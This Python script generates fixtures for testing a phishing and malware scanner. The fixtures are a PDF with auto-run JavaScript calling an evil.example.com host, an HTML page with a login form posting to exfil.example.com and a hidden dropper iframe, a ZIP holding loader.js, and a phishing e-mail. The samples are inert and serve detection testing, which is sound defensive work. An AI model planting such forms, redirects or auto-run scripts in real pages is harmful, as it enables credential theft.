#!/usr/bin/env python3
# SPDX-License-Identifier: EUPL-1.2
# Copyright (C) 2026 Carsten Rosenberg <c.rosenberg@heinlein-support.de>
"""Generate synthetic test fixture files for xspct_scan.

Run once from the repository root before running the test suite with
feature-file tests enabled:

    python tests/create_fixtures.py

All files are placed in ``tests/fixtures/`` and are safe to commit.
They are deterministic — running this script a second time overwrites the
files with identical content.

Generated fixtures
------------------
pdf_javascript.pdf
    Minimal PDF with document-level JavaScript: ``app.launchURL``,
    ``eval(unescape(…))``, and ``String.fromCharCode`` so that
    ``analyze_pdf`` + ``analyze_javascript`` detect multiple findings.

pdf_embedded.pdf
    PDF with one embedded file attachment (``payload.txt``) so that
    ``has_embedded_files`` is reported as ``True``.

pdf_uri.pdf
    PDF containing a hyperlink annotation pointing at an external URI so
    that the URI is extracted into ``iocs.urls``.

html_phishing.html
    HTML document with all major phishing / malware indicators:
    ``<form>``, ``<iframe>``, meta-refresh redirect, ``eval()``, ``atob()``,
    ``document.write()``, ``String.fromCharCode()``, CSS display:none /
    visibility:hidden / position:absolute off-screen hiding, and at least
    one external URL for IOC extraction.

archive_mixed.zip
    ZIP containing a plain-text file (with an IOC URL), a JS file, and a
    nested PDF (so that archive member analysis fires).

email_with_attachment.eml
    RFC 2822 multipart/mixed e-mail with a text body and a binary
    attachment named ``invoice.pdf`` (containing text content).  Used to
    test the EML → archive routing introduced for sflock2.

qr_code.png (optional)
    PNG image of a QR code encoding a URL.  Created only when ``qrcode``
    or ``segno`` is installed.  Tests that require this file are
    automatically skipped when it is absent.
"""

import io
import email.message
import sys
import zipfile
from pathlib import Path

FIXTURES = Path(__file__).parent / 'fixtures'
FIXTURES.mkdir(exist_ok=True)

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _ok(path: Path) -> None:
    print(f'  ✓  {path.name}')


def _skip(name: str, reason: str) -> None:
    print(f'  -  {name}  [{reason}]')


# ---------------------------------------------------------------------------
# PDF fixtures (PyMuPDF is a mandatory project dependency)
# ---------------------------------------------------------------------------


def make_pdfs() -> None:
    print('\n--- PDF fixtures ---')
    try:
        import fitz  # type: ignore[import-untyped]
    except ImportError:
        _skip('pdf_*.pdf', 'PyMuPDF (fitz) not installed')
        return

    def _inject_openaction_js(doc, js_code: str) -> None:
        """Wire a JavaScript /OpenAction into *doc*'s catalog.

        PyMuPDF 1.27 has no ``add_js`` convenience method; we create a raw
        PDF action object and patch it into the document catalog directly.
        """
        js_xref = doc.get_new_xref()
        # Escape inner quotes; keep it on a single PDF string line
        safe = js_code.replace('\\', '\\\\').replace('(', '\\(').replace(')', '\\)')
        doc.update_object(
            js_xref,
            f'<</Type /Action /S /JavaScript /JS ({safe})>>',
        )
        cat_xref = doc.pdf_catalog()
        cat_obj  = doc.xref_object(cat_xref)
        # Insert /OpenAction reference before the closing >>
        cat_obj_new = (
            cat_obj.rstrip().rstrip('>').rstrip()
            + f'\n  /OpenAction {js_xref} 0 R\n>>'
        )
        doc.update_object(cat_xref, cat_obj_new)

    # -- pdf_javascript.pdf ---------------------------------------------------
    doc = fitz.open()
    page = doc.new_page()
    page.insert_text((50, 72), 'PDF with JavaScript — xspct_scan test fixture')
    _inject_openaction_js(
        doc,
        'app.launchURL("https://evil.example.com/payload"); '
        'eval(unescape("%61%6c%65%72%74%281%29")); '
        'var s = String.fromCharCode(104,116,116,112,115); '
        'document.write("<b>injected</b>");',
    )
    out = FIXTURES / 'pdf_javascript.pdf'
    doc.save(str(out))
    doc.close()
    _ok(out)

    # -- pdf_embedded.pdf -----------------------------------------------------
    doc = fitz.open()
    page = doc.new_page()
    page.insert_text((50, 72), 'PDF with embedded file — xspct_scan test fixture')
    # embfile_add(name, buffer, filename, ufilename, desc)
    doc.embfile_add(
        'payload',
        b'malicious payload content\nhttps://exfil.example.com/steal\n',
        filename='payload.txt',
        ufilename='payload.txt',
        desc='Embedded test payload',
    )
    out = FIXTURES / 'pdf_embedded.pdf'
    doc.save(str(out))
    doc.close()
    _ok(out)

    # -- pdf_uri.pdf ----------------------------------------------------------
    doc = fitz.open()
    page = doc.new_page()
    page.insert_text((50, 72), 'PDF with external URI — xspct_scan test fixture')
    page.insert_link({
        'kind': fitz.LINK_URI,
        'from': fitz.Rect(50, 100, 300, 120),
        'uri': 'https://evil.example.com/openaction-uri',
    })
    out = FIXTURES / 'pdf_uri.pdf'
    doc.save(str(out))
    doc.close()
    _ok(out)


# ---------------------------------------------------------------------------
# HTML phishing fixture
# ---------------------------------------------------------------------------


def make_html() -> None:
    print('\n--- HTML fixture ---')
    html = """\
<!DOCTYPE html>
<html>
<head>
  <title>Invoice Q1-2026</title>
  <!-- meta-refresh redirect — phishing indicator -->
  <meta http-equiv="refresh" content="0; url=https://phishing.example.com/login">
  <style>
    /* CSS content-hiding — should trigger analyze_css_hiding */
    .steal   { display: none; }
    .offscr  { visibility: hidden; position: absolute; top: -9999px; left: -9999px; }
    .zerosize { width: 0; height: 0; overflow: hidden; }
  </style>
</head>
<body>

<!-- Inline JavaScript with suspicious functions -->
<script>
  eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%27%3c%62%3e%74%65%73%74%3c%2f%62%3e%27%29'));
  var decoded = atob('aHR0cHM6Ly9ldmlsLmV4YW1wbGUuY29tL2MyLWJlYWNvbg==');
  document.write('<img src="https://tracker.example.com/pixel.gif?id=1">');
  var shellcode = String.fromCharCode(0x68,0x74,0x74,0x70);
</script>

<!-- HTML form — credential harvesting indicator -->
<form action="https://exfil.example.com/steal" method="POST">
  <input type="text"     name="username" placeholder="Username">
  <input type="password" name="password" placeholder="Password">
  <input type="hidden"   name="token"    value="abc123">
  <input type="submit"   value="Log in">
</form>

<!-- Hidden iframe loading external content -->
<iframe src="https://malware.example.com/dropper-frame"
        width="0" height="0" style="display:none;"></iframe>

<!-- CSS-hidden content with IOC URL -->
<div class="steal">
  Hidden exfiltration URL: https://hidden-c2.example.com/exfil
</div>

<!-- Large base64-like blob (HTML smuggling indicator — 1200+ contiguous chars) -->
<script>
var payload = "sUu7bdfbASRXWkQR38MMyVrp/tSD1HidqAqcJ7r51gTieccxsYmp1bjY5oq6e15ywl0LpzOhsCVAzopg9efIUn4jn6AASWXVMLfE/7ZsYgblXksUliHTT6fagA7wGSce7sqQfdaNq5AJ5syk6SmeB+hQ6Ymv7FnNlkbJAxVJIQ1B+QrwCKpaiAMXUpfzEVkao9SS9WsHem/adtGaGjZ63Ts25XWLgykGQXRl9uNHWIjMgRJYhQZeXtYolaqmBEx8CzI6Xvq2pMKobhe19MwAkUhJRIATdhLK3gP0W06IUHhS6hNvkqfSbMP1l/+sHtBfVl0C8GqYpn5SWvfAhD7oLfSKcr1xhzEiX+yrlWe7O1eyyjn93sBvBhFuWCajCjrCUQTlT155/kp6Rn0SotSvDgDArzlKvzuXQvfPyfernVIHwFd/W/QJxehDGfDattzECUyzAGDH/R/6X9uNC43jdjwmGsXwNuvQwJGoWoCYcfS022dhIX1IKpEyucBk9JR5zrY86rdL1P4dKQZ4V3Q//3qwziwFFjxsMGZvn3Dv7a4hbJdbZmphVdbNpsXAaUs+0b0olhx4oIhUFS7Kky1Q51ehPwDZk0Td2MGiyi4IXTZ6LBne/TVc0X5+ArlgoKy4U6BOCWCaNIP51GW8hP3gYn+nGVf9mlIdVEsRynC7mB1uJH2bMq8eQhJcYa/QJtMh9KmKSU+6jfOlEaCWwOj9rbXqjjhbFPfS9kY8ufURjMnd2bCpjnmoxxZIjPGjpVHEMbg4yV2XrXtPwtPpEfycELfpYdWXXgfAT1YnUXB4gF29rQ73e0SOyuGNZ1Ashft8cFnwrfxalb/Y98rzTTqahn/bxSuHIoCR58CO98oM1XgOymaKwbolUy6fciPn4aU82IzpzxxAp3G9ETCbMHPmyvIOTCD+qu48qzSExfmuGnP3YEhj3W7LM4Z279owgI7oYPs9vtkyh8c62UQtDP6mzbiM7Mw8VzvobCdjXWZcNpFOioPvvmXJdBeS0yy0Lf5c5E7h5Gv2ml1jfhv9jCbarWVGjCMonQIDz/i0ksNdlLEkKbPxY5rOH4Gk2T6R+BrQxWQwZ0SBSejfm4ELwROLkGrI+mSNYJrH4Ve1GquOONUEvbPWnfDK16dk4pWoZ4HsNxb0ubCnpYxwN6s0cVBZgGqnDWvbS+HSsakKq77bkbsk/FbG";
</script>

</body>
</html>
"""
    out = FIXTURES / 'html_phishing.html'
    out.write_text(html, encoding='utf-8')
    _ok(out)


# ---------------------------------------------------------------------------
# Mixed ZIP archive
# ---------------------------------------------------------------------------


def make_zip() -> None:
    print('\n--- Archive fixture ---')

    # Nested PDF — use PyMuPDF if available, else raw bytes
    try:
        import fitz  # type: ignore[import-untyped]
        doc = fitz.open()
        page = doc.new_page()
        page.insert_text((50, 72), 'Nested PDF inside archive — xspct_scan fixture')
        # Inject JS via OpenAction using the same helper as make_pdfs()
        js_xref = doc.get_new_xref()
        doc.update_object(
            js_xref,
            '<</Type /Action /S /JavaScript /JS '
            '(eval("alert(1)"); app.launchURL("https://nested-pdf.example.com/c2"))>>',
        )
        cat_xref = doc.pdf_catalog()
        cat_obj  = doc.xref_object(cat_xref)
        cat_obj_new = (
            cat_obj.rstrip().rstrip('>').rstrip()
            + f'\n  /OpenAction {js_xref} 0 R\n>>'
        )
        doc.update_object(cat_xref, cat_obj_new)
        pdf_bytes = doc.tobytes()
        doc.close()
    except ImportError:
        # Minimal syntactically-valid PDF with JS markers (byte-scan only)
        pdf_bytes = (
            b'%PDF-1.4\n'
            b'/JS /JavaScript /OpenAction\n'
            b'%%EOF\n'
        )

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', compression=zipfile.ZIP_DEFLATED) as zf:
        # Plain text with an IOC URL (triggers text member analysis + IOC extraction)
        zf.writestr(
            'readme.txt',
            'Test archive fixture for xspct_scan.\n'
            'Suspicious URL: https://ioc-from-archive.example.com/path\n'
            'Second IOC: https://another-ioc.example.com/stage2\n',
        )
        # JavaScript file (triggers analyze_javascript via sync_analyze → text)
        zf.writestr(
            'loader.js',
            'eval(unescape("%61%6c%65%72%74%281%29"));\n'
            'document.write("<script src=https://cdn.evil.example.com/x.js></script>");\n',
        )
        # Nested PDF (triggers analyze_pdf on the member)
        zf.writestr('invoice.pdf', pdf_bytes)
        # Sub-directory text file
        zf.writestr('subdir/data.txt', 'sub-directory content\nhttps://subdir.example.com/\n')

    out = FIXTURES / 'archive_mixed.zip'
    out.write_bytes(buf.getvalue())
    _ok(out)


# ---------------------------------------------------------------------------
# EML with attachment
# ---------------------------------------------------------------------------


def make_eml() -> None:
    print('\n--- EML fixture ---')
    msg = email.message.EmailMessage()
    msg['From']    = 'attacker@evil.example.com'
    msg['To']      = 'victim@company.example.com'
    msg['Subject'] = 'Invoice Q1/2026 — please review'
    msg['Message-ID'] = '<fixture-001@xspct-scan.test>'
    msg.set_content(
        'Dear Sir/Madam,\n\n'
        'Please find attached the invoice for Q1/2026.\n\n'
        'Best regards\n\n'
        'http://phishing.example.com/invoice-landing\n',
        charset='utf-8',
    )
    # Attachment: a plain-text "PDF" with suspicious content
    attachment = (
        'This attachment simulates a malicious document.\n'
        'eval("shellcode");\n'
        'https://malware.example.com/c2-beacon\n'
        'https://exfil.example.com/data-upload\n'
    ).encode('utf-8')
    msg.add_attachment(
        attachment,
        maintype='application',
        subtype='octet-stream',
        filename='invoice.pdf',
    )
    out = FIXTURES / 'email_with_attachment.eml'
    out.write_bytes(msg.as_bytes())
    _ok(out)


# ---------------------------------------------------------------------------
# QR code PNG (optional — requires qrcode or segno)
# ---------------------------------------------------------------------------


def make_qr() -> None:
    print('\n--- QR code fixture ---')
    url = 'https://qr-malware.example.com/download-payload'

    # Try qrcode first
    try:
        import qrcode  # type: ignore[import-untyped]
        img = qrcode.make(url)
        buf = io.BytesIO()
        img.save(buf, format='PNG')
        out = FIXTURES / 'qr_code.png'
        out.write_bytes(buf.getvalue())
        _ok(out)
        return
    except ImportError:
        pass

    # Fall back to segno
    try:
        import segno  # type: ignore[import-untyped]
        qr = segno.make(url)
        buf = io.BytesIO()
        qr.save(buf, kind='png', scale=4)
        out = FIXTURES / 'qr_code.png'
        out.write_bytes(buf.getvalue())
        _ok(out)
        return
    except ImportError:
        pass

    _skip('qr_code.png', 'neither qrcode nor segno is installed')


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------


if __name__ == '__main__':
    print(f'Generating fixtures in {FIXTURES}')
    make_pdfs()
    make_html()
    make_zip()
    make_eml()
    make_qr()
    print('\nDone.')
    sys.exit(0)
